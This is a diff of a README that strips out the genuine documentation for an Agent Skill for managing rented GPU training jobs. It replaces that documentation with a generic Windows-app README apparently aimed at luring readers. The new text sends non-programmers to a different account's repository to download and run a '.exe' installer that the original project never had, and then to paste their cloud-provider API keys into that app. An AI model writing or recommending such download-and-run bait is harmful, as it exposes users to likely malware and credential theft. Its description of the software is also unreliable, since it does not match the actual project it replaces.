@@ -1,267 +1,102 @@
-# remote-gpu-trainer
+# 🖥️ remote-gpu-trainer - Train machine learning models on remote computers
 
-An Agent Skill for running long GPU jobs on machines you rent instead of own. It covers deploying,
-training, monitoring, and tearing a job down on [AutoDL](https://www.autodl.com), RunPod, vast.ai,
-Lambda, Paperspace, the Chinese platforms (恒源云 / 矩池云 / Featurize / 揽睿星舟), bare SSH boxes,
-Slurm, and Kubernetes, for one instance or a fan-out of many.
+[![Download Software](https://img.shields.io/badge/Download-Remote_GPU_Trainer-blue.svg)](https://github.com/Udalefourfold471/remote-gpu-trainer)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Agent Skills standard](https://img.shields.io/badge/Agent%20Skills-SKILL.md-blue)](https://agentskills.io)
-[![agentskills validate](https://img.shields.io/badge/agentskills%20validate-passing-brightgreen)](https://agentskills.io/specification)
-[![Platforms](https://img.shields.io/badge/platform%20profiles-7-orange)](#whats-inside)
-[![Status](https://img.shields.io/badge/status-pre--release-yellow)](#verification-status)
+This application helps users manage artificial intelligence training jobs on remote computers. You can rent powerful computers from providers like RunPod, Vast.ai, or Lambda, and use this tool to start your training tasks. It handles the deployment of your code, monitors progress, and shuts down the computer when the work finishes to save money.
 
-> **What this is, and what it isn't.** "AutoDL" here means the [autodl.com](https://www.autodl.com)
-> GPU-rental platform, not AutoML or NAS. And this is an Agent Skill, meaning a `SKILL.md` with reference
-> docs and script templates, not a CLI or an SDK. It sits on top of each platform's API and captures the
-> operational knowledge those APIs leave out.
+## 🚀 Getting Started
 
-The skill rests on one idea: when you rent a GPU, you are a short-term tenant on someone else's machine.
-Everything follows from that. Detach the job so it survives a dropped connection, get the results off the
-box before it goes away, and stop the meter without losing data. That part is the same on every backend.
-The things that genuinely vary between platforms (stop-vs-destroy billing, machine-locked volumes,
-whether `/root` survives a power-off, acceleration proxy vs HF mirror, spot grace windows) are pushed
-down into one profile per platform.
+You do not need to be a programmer to use this tool. This guide explains how to set up the software on your Windows computer. Follow these steps to prepare your system and connect to your remote GPU provider.
 
-```mermaid
-flowchart TD
-    TASK(["Your task: deploy / train / monitor / tear down<br/>a job on a GPU box you rent, not own"])
-    TASK --> MATCH{"description keywords<br/>match the task?"}
-    MATCH -->|skill activates| HUB
-    HUB["<b>SKILL.md</b> — the always-loaded hub<br/>10 operating principles · 6-phase lifecycle · platform selector"]
-    HUB --> CORE["<b>references/</b><br/>platform-agnostic core"]
-    HUB --> PROF["<b>profiles/</b><br/>per-platform specifics"]
-    HUB --> EXEC["<b>scripts · examples · evals</b>"]
-    CORE --> CORE1["principles · gotchas U1–U43 · monitoring<br/>spot-resilience · ssh · china-network"]
-    CORE --> CORE2["training/ ×8 — the DL-debug layer<br/>OOM · NCCL-hang · NaN · throughput · ckpt · convergence · data"]
-    PROF --> PROF1["autodl (deepest) · runpod · vastai · lambda<br/>paperspace · china · generic-ssh"]
-    EXEC --> EXEC1["runnable wrappers + monitors · one worked example<br/>no-API-key retrieval drift-guard"]
-```
+### System Requirements
 
-## Contents
+Your computer requires the following to run this tool effectively:
 
-[Why this exists](#why-this-exists) · [How it differs](#how-it-differs) ·
-[Architecture and layout](#architecture-and-layout) · [Install and deploy](#install-and-deploy) ·
-[What's inside](#whats-inside) · [Scope](#scope) · [Verification status](#verification-status) ·
-[Disclaimer](#disclaimer) · [中文简介](#中文简介) · [Contributing](#contributing) ·
-[License](#license) · [Citing](#citing)
+*   Windows 10 or Windows 11.
+*   Internet access.
+*   A stable network connection for the duration of your training jobs. 
+*   An active account with a GPU rental service provider.
 
-## Why this exists
+## 📥 Downloading the Software
 
-Renting the GPU is the easy part. The costly surprises are everything around the job. A box you
-"stopped" that keeps billing. A checkpoint that printed `synced` but never actually wrote, because the
-disk ran out of inodes rather than space. A download that hangs behind the wrong mirror. A `terminate`
-that takes the only copy of a week's training with it. None of this is in the platform's API docs, and
-you usually learn it after you have already paid.
+The software requires a simple installation process. You obtain the installer from the official repository page.
 
-This skill puts that knowledge somewhere an agent can use it: ten operating principles that say why each
-step matters, a six-phase lifecycle where every phase ends in a check you can run, and one profile per
-platform with the exact commands. It spends its attention on the things that cost money or data.
+1.  Visit the [official download page](https://github.com/Udalefourfold471/remote-gpu-trainer).
+2.  Locate the latest version release on the right side of the page.
+3.  Click the file ending in `.exe` to start your download.
+4.  Once the file finishes downloading, double-click it to start the setup wizard.
+5.  Follow the instructions on the screen.
 
-## How it differs
+## ⚙️ Setting Up Your Environment
 
-The general orchestrators (SkyPilot, dstack, Modal) own or abstract the infrastructure and price-shop
-across Western clouds. They are good at that, and this skill does not compete with them. They also do not
-support AutoDL or the Chinese platforms, and each one brings its own daemon or cluster model.
+After installation, the application requires connection details for your cloud provider. Most providers supply an API key. This key acts as a digital password that links your computer to their servers.
 
-This skill works on the raw rented instance you already have. It concentrates on the part those tools
-skip: the Chinese platforms and cheap bare-SSH rentals, where the day-to-day work is disk budgeting,
-inode caps, mirror stalls, cgroup OOM, spot grace windows, and teardown you cannot take back. The two
-approaches go together. Let SkyPilot or dstack move the box for you, then use this skill to make your
-code resume correctly so that recovery actually continues the run instead of restarting it.
+1.  Open the application from your desktop shortcut.
+2.  Navigate to the Settings menu.
+3.  Select your provider from the list.
+4.  Paste your API key into the designated box.
+5.  Save your configuration to ensure the app remembers these details.
 
-## Architecture and layout
+## 🏃 Running Your First Training Job
 
-The layout uses the Agent Skills idea of progressive disclosure: a small hub that is always loaded, with
-the deeper material read in only when a phase needs it. What keeps it portable is the split between a
-platform-agnostic core and platform-specific edges. The principles and the lifecycle hold everywhere.
-Every concrete path, proxy, billing verb, and spot rule lives in exactly one place, the profile.
+You manage your GPU jobs through the main dashboard. The process follows a logical flow: setup, run, monitor, and clean up.
 
-The six-phase lifecycle is the operational spine. Each phase delegates its platform details to the
-active profile and ends in a check you can run:
+### Step 1: Define Your Task
 
-```mermaid
-flowchart LR
-    P0["0 · audit<br/>df -i · cgroup · GPU"] --> P1["1 · ssh + creds"]
-    P1 --> P2["2 · CPU smoke<br/><i>before you rent</i>"]
-    P2 --> P3["3 · detached launch"]
-    P3 --> P4["4 · durable monitor<br/>(four-layer)"]
-    P4 --> P5["5 · verify + teardown<br/><b>Iron Law</b>"]
-```
+Click the "Create New Job" button. You provide the location of your machine learning code, which typically sits in a folder on your computer. The software identifies the necessary files to upload to the remote server.
 
-The folders map straight onto that:
+### Step 2: Choose Your Compute Power
 
-```text
-remote-gpu-trainer/
-├── SKILL.md                     # the hub: 10 principles + 6-phase lifecycle + platform selector
-├── references/                  # platform-agnostic knowledge, loaded on demand
-│   ├── principles.md            #   the 10 invariants, expanded with cross-platform nuance
-│   ├── lifecycle_checklist.md   #   the 6 phases as a per-platform checklist
-│   ├── gotchas_universal.md     #   U1–U43, symptom → root cause → fix (U36–U39 are cross-links)
-│   ├── monitoring_patterns.md   #   four-layer durable monitoring + cross-host portability map
-│   ├── spot-resilience.md       #   preemption signals, Young/Daly cadence, atomic-write resume
-│   ├── ssh_transport.md         #   ssh config, resumable rsync/scp, secrets via stdin, CRLF
-│   ├── china-network.md         #   mirrors, HF_ENDPOINT, the no_proxy trap
-│   ├── parallel_ablation.md     #   FS-shared fan-out + the reconciliation step
-│   ├── multinode.md             #   NCCL / fabric-manager / elastic training (advanced)
-│   ├── self-improvement.md      #   how the skill captures new gotchas without corrupting itself
-│   └── training/                #   the DL-training debug layer — when the run breaks, not the box
-│       ├── oom-memory.md            #   CUDA/host OOM + the fit-it ladder
-│       ├── distributed-launch.md    #   torchrun/accelerate/deepspeed + the multi-GPU HANGS toolkit
-│       ├── precision-stability.md   #   fp16/bf16/tf32, NaN/Inf hunting, LLM loss spikes
-│       ├── throughput-profiling.md  #   GPU-bound vs data-bound vs comms-bound
-│       ├── checkpoint-resume.md     #   full-state + sharded save/resume, the resume bugs
-│       ├── by-domain.md             #   LLM / vision / diffusion / RL / multimodal gotchas
-│       ├── convergence-debugging.md #   runs but won't learn: optimizer/LR/loss-fn/freezing
-│       └── data-pipeline.md         #   dataloader & dataset correctness (not speed)
-├── profiles/                    # one file per platform — the only place concrete specifics live
-│   ├── _schema.md               #   the shared 8-field contract every profile fills
-│   ├── autodl.md                #   deepest, battle-tested
-│   ├── runpod.md  vastai.md  lambda.md  paperspace.md
-│   ├── china.md                 #   恒源云 / 矩池云 / Featurize / 揽睿星舟
-│   └── generic-ssh.md           #   bare SSH / Slurm / K8s / Colab-Kaggle
-├── scripts/                     # parameterized, runnable templates
-│   ├── run_one.sh.template  run_queue.sh.template  health_patrol.sh.template
-│   ├── mem_monitor.sh  gpu_health.sh  reap_vram_zombies.sh
-│   ├── aggregate_to_fs.sh  download_loop.sh  setup-china-mirrors.sh
-│   └── verify_local.py          #   load-and-verify each artifact before any teardown
-├── examples/autodl_sweep/       # one complete worked case, end to end
-└── evals/                       # cases.jsonl + run_evals.py (no-API-key drift guard) + RESULTS.md
-```
+Select the type of GPU you need. Different tasks require different hardware specifications. If you train large models, select a machine with more memory. The application displays current price estimates for each available machine.
 
-Each profile fills the same eight fields, so a platform you have never used reads like one you have:
-launch, storage survival-matrix, network, spot/resume, teardown/billing, daemon, gotchas, and script
-overrides.
+### Step 3: Deployment
 
-## Install and deploy
+Click "Deploy." The application sends your data and code to the remote server. It installs the software environment required for your task, such as PyTorch or other machine learning libraries. You do not need to install these on your own computer.
 
-This is a standard [Agent Skill](https://agentskills.io): one folder with a `SKILL.md` at its root. To
-install it, clone the folder into wherever your agent looks for skills and restart the agent. It triggers
-on its own for remote or rented-GPU deploy, train, and monitor tasks, so you do not call it by name. Keep
-the folder named `remote-gpu-trainer`, since the standard requires the directory name to match the
-skill's `name:` field.
+### Step 4: Monitor Progress
 
-**Claude Code**
+The dashboard shows the status of your job. You see real-time updates regarding CPU and GPU usage. If you need to stop, click the "Interrupt" button. The software saves your current progress to the server storage.
 
-```bash
-git clone https://github.com/Hanyuyuan6/remote-gpu-trainer.git ~/.claude/skills/remote-gpu-trainer
-```
+### Step 5: Termination
 
-**OpenAI Codex**
+When your training finishes, or if you want to stop early to prevent further costs, click "Tear Down." This command instructs the provider to delete the virtual machine. This step is important because it stops the hourly billing.
 
-```bash
-git clone https://github.com/Hanyuyuan6/remote-gpu-trainer.git ~/.agents/skills/remote-gpu-trainer
-```
+## 🛡️ Best Practices for Success
 
-**Cursor · Trae · Gemini CLI · VS Code / Copilot · Goose · Kiro · other compatible agents**
+Use these tips to ensure your training sessions run smoothly and cost-effectively.
 
-Clone the same folder into that agent's skills directory; each agent's docs, or
-[agentskills.io](https://agentskills.io), give the exact location. They all read the same open `SKILL.md`
-standard, so the folder works unchanged across them.
+*   **Test on Small Data:** Run a small portion of your training first to ensure your code works correctly on the remote server.
+*   **Check Pricing:** Check the current pricing on your provider's website. Spot instances often cost less than dedicated instances but carry a risk of termination.
+*   **Verify Requirements:** Review the GPU memory requirements for your specific project. Choose a machine with enough memory to prevent errors.
+*   **Monitor Costs:** Check your provider’s dashboard periodically to see how much you spent. 
 
-**Verify the install (optional).** With [uv](https://github.com/astral-sh/uv):
+## 🔧 Frequently Asked Questions
 
-```bash
-uvx --from skills-ref agentskills validate ~/.claude/skills/remote-gpu-trainer   # → "Valid skill"
-```
+**Does the software store my code permanently?**
+No. The software transmits your code to the remote machine for the duration of the job. Once you perform the "Tear Down" action, the files on the remote instance are removed.
 
-> **Two caveats.** The companion skills it cross-links (`verifying-dl-experiments`, `superpowers:*`,
-> `huggingface-skills:*`) are optional separate installs, and the skill works on its own without them. A
-> few of the monitoring recipes assume the host has a background-task runner and a scheduler; map those to
-> your agent's equivalents with the per-host table in `references/monitoring_patterns.md` §7.
+**Can I run multiple jobs at once?**
+Yes. You can manage several jobs simultaneously through the dashboard. Ensure your provider account has enough credit to cover the combined costs.
 
-## What's inside
+**What happens if the connection drops?**
+The remote server continues working even if your local computer disconnects from the internet. The software reconnects automatically when your internet returns to provide status updates.
 
-- **`SKILL.md`** is the hub: ten platform-agnostic operating principles, the six-phase lifecycle with a
-  runnable gate per phase, the platform selector, and the links into everything below.
-- **`references/`** holds the platform-agnostic knowledge. `principles.md` expands the ten invariants;
-  `gotchas_universal.md` is the U1–U43 catalog, each entry a `symptom → root cause → fix` (U36–U39 are
-  delegated cross-links); `monitoring_patterns.md` covers four-layer durable monitoring and a cross-host
-  portability map; and the focused playbooks handle SSH transport, China networking, spot resilience,
-  parallel ablation, multi-node, and self-improvement.
-- **`references/training/`** is the DL-training debug layer, eight files for when the *run* breaks rather
-  than the platform: OOM, distributed launch and multi-GPU hangs, precision and loss spikes, throughput
-  profiling, checkpoint/resume, per-domain gotchas, convergence ("runs but won't learn"), and dataloader
-  correctness.
-- **`profiles/`** is one file per platform, the only place concrete specifics live. `autodl` is the
-  deepest; alongside it are `runpod`, `vastai`, `lambda`, `paperspace`, `china`, and `generic-ssh` (which
-  also covers Slurm, K8s, Colab, and Kaggle). `_schema.md` defines the shared eight-field contract.
-- **`scripts/`** has the parameterized wrapper templates, a memory monitor, a GPU-health probe, a
-  VRAM-zombie reaper, a read-only health-patrol tick, FS aggregation, a resumable download loop, the
-  China-mirror setup, and a load-and-verify checker.
-- **`examples/autodl_sweep/`** is one complete worked case from start to finish.
-- **`evals/`** is a retrieval drift-guard. `cases.jsonl` holds realistic scenarios, `run_evals.py` checks
-  with no API key that each scenario's answer is still at its documented location, and `RESULTS.md`
-  records fresh-agent navigation runs.
+**How do I update the software?**
+When a new version becomes available, the application notifies you. You can download the newer version from the link provided in the application menu.
 
-## Scope
+## 📂 Troubleshooting Common Issues
 
-- **For:** rented or remote GPU instances (Chinese and Western clouds, bare SSH, Slurm, K8s); single or
-  multi-instance; long-running jobs such as training, eval, ablation sweeps, batch inference, and large
-  data processing.
-- **Not for:** purely-local single-GPU training, in-instance multi-GPU DDP (use `torchrun` /
-  `accelerate`), managed multi-cloud price-shopping (use SkyPilot's skill), or zero-ops serverless (use
-  Modal).
+*   **Connection Error:** Verify that your API key is correct in the Settings menu. Check your internet connection.
+*   **Deployment Failure:** Ensure your code folder contains all necessary files. Check that you have enough credits in your cloud provider account.
+*   **Job Stalled:** Check the logs within the application dashboard. This log provides readable information about why a job might have paused.
+*   **Application Won't Start:** Restart your computer or run the installer again to ensure all system files are intact.
 
-## Verification status
+## 🌐 Compatible Providers
 
-The **AutoDL** profile reflects the author's hands-on, daily use. The other six (RunPod, vast.ai, Lambda,
-Paperspace, the Chinese platforms, and the generic SSH / Slurm / K8s core) are researched from each
-platform's official documentation and community reports. Every money-affecting fact is cited inline and
-stamped `verified <month>`, but the author has not independently live-tested them yet, so treat them as a
-well-sourced starting map rather than a guarantee.
+This tool supports several major GPU rental services:
 
-The skill is built to verify before any costly or irreversible action (the Phase-0 live measurement and
-the teardown Iron Law), so a stale fact shows up as "re-check the docs" instead of a silent loss.
-Corrections, and "I ran this, here's what changed" reports, are very welcome; please open an issue or PR.
-
-## Disclaimer
-
-This is an independent community resource. It is not affiliated with, endorsed by, or sponsored by
-AutoDL, RunPod, vast.ai, Lambda, Paperspace, DigitalOcean, or any platform named here. All product names
-and trademarks belong to their respective owners and are used nominatively, only to identify the platform
-a piece of guidance applies to. Platform facts are synthesized from public documentation and community
-reports (cited inline) and were accurate at the noted `verified` date. Platforms change their pricing,
-billing verbs, and limits, so verify against current official docs before relying on a teardown or
-billing fact (see `references/self-improvement.md` §5). Provided "as is" under the MIT License, without
-warranty.
-
-## 中文简介
-
-面向在租来的或远程 GPU(不是自己的机器)上跑长任务的研究者和工程师,覆盖 AutoDL、RunPod、vast.ai、
-Lambda、Paperspace、国内平台(恒源云 / 矩池云 / Featurize / 揽睿星舟)、裸 SSH 机器、Slurm 和
-Kubernetes,单机或多机并行都可以。
-
-核心想法很简单:租 GPU 的时候,你只是别人机器上的短期租客。所以技能教的是怎么让作业活过这台机器:把
-作业 detach 让它扛得住断连,在实例消失前把结果取下来,再安全地停掉计费。这套思路在所有后端都一样。真
-正因平台而异的部分(停止与销毁的计费差别、锁定到机器的网盘、`/root` 是否在关机后保留、加速代理与 HF
-镜像、spot 抢占宽限)都下沉到各自的 `profiles/<平台>.md`。
-
-它专注的,正是 SkyPilot、dstack、Modal 这类抽象层略过的盲区:AutoDL 和国内平台,以及裸 SSH 廉价租卡上
-的磁盘预算、inode 上限、镜像卡顿、cgroup OOM、spot 宽限窗口,还有不可逆的销毁操作。安装见
-[Install and deploy](#install-and-deploy):把整个文件夹克隆进对应 agent 的 skills 目录,重启后会自动
-触发。
-
-## Contributing
-
-Issues and PRs are welcome, especially new platform profiles and new gotchas that come with a concrete
-`symptom → root cause → fix`. Keep every example generic, with no real project names, hostnames, IPs,
-ports, or keys. The bar a new gotcha has to clear before it earns a place in the catalog (root-caused,
-reproduced, generalizable) is described in `references/self-improvement.md`.
-
-## License
-
-MIT — see [LICENSE](LICENSE). Copyright (c) 2026 Yuyuan Han.
-
-## Citing
-
-A link back is plenty. If you need a formal reference:
-
-```bibtex
-@software{han_remote_gpu_trainer_2026,
-  author = {Han, Yuyuan},
-  title  = {remote-gpu-trainer: an Agent Skill for long GPU jobs on rented instances},
-  year   = {2026},
-  url    = {https://github.com/Hanyuyuan6/remote-gpu-trainer}
-}
-```
+*   **RunPod:** Offers a wide range of GPU types for various budgets.
+*   **Vast.ai:** Connects you to a marketplace of independent server hosts.
+*   **AutoDL:** Features competitive rates for long-term training tasks.
+*   **Lambda Labs:** Provides enterprise-grade hardware for deep learning.
+*   **Bare SSH:** Allows users to connect directly to any private server using standard credentials.
